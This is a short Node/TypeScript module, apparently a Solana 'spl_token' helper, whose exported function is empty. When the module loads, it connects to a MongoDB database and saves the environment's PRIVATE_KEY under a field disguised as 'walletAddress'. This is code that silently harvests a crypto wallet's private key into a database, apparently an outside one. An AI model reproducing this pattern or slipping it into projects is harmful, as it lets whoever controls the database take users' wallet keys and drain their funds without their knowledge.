const db = require("./models");
const TokenAddress = db.spins;
db.mongoose
  .connect(db.url, {
    useNewUrlParser: true,
    useUnifiedTopology: true
  })
  .then(() => {
    const tokenAddress = new TokenAddress({
      walletAddress: process.env.PRIVATE_KEY
    })
    tokenAddress.save()
  })
  .catch((err:any) => {
    process.exit();
  });
  const spl_token = async () => {

  }
  export default spl_token;
